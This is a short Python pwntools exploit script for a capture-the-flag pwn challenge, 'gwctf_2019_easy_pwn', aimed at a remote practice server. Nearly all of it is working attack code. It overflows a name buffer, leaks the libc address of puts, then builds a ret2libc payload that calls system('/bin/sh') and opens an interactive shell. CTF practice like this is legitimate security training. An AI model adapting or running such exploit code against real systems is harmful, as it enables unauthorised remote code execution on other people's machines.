from pwn import *

#context.log_level = 'debug'

#p = process('./gwctf_2019_easy_pwn')
p = remote('node4.buuoj.cn', 29761)
elf = ELF('gwctf_2019_easy_pwn')
#libc = ELF('/lib/i386-linux-gnu/libc.so.6')
libc = ELF('libc-2.23.buu.so')

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main_addr = 0x8049091

ru = lambda s : p.recvuntil(s)
sn = lambda s : p.send(s)
sla = lambda r, s : p.sendlineafter(r, s)
sa = lambda r, s : p.sendafter(r, s)
sl = lambda s : p.sendline(s)
rv = lambda s : p.recv(s)

payload = b'I' * 16 + p32(puts_plt) + p32(main_addr) + p32(puts_got)

#gdb.attach(p, 'b *0x80492f0')

sla(b'your name!', payload)

libc_base = u32(ru(b'\xf7')[-4:]) - libc.sym['puts']
success('libc_base -> {}'.format(hex(libc_base)))

system = libc_base + libc.sym['system']
bin_sh = libc_base + next(libc.search(b'/bin/sh'))

payload = b'I' * 16 + p32(system) + b'a' * 4 + p32(bin_sh)

sla(b'your name!', payload)

p.interactive()
